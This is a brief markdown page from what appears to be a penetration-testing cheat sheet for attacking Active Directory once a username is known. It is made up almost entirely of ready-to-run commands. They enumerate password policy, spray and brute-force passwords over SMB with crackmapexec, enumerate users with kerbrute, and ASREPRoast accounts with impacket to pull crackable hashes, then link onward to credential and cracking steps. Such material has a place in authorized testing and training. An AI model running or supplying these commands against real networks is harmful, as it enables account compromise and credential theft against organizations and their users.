# Got Username
## Get Password Policy
```bash
crackmapexec 10.10.10.10 -u 'username' -p 'password' --pass-pol 
```

```bash
enum4linux -u 'username' -p 'password' -P <ip>
```

## Password Spray
Test password against usernames in order. Won't brute force each password against each user.
```bash
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

Test each password against each username. Careful of lockout policy.
```bash
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
```

Got Credentials: [Next](got-credentials.md)

## Testing Usernames
```bash
kerbrute userenum -d domain.local --dc domain.local users.txt
```

## ASREPRoast
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
```

Got Hash: [Next](cracking-hashes.md#tgt)

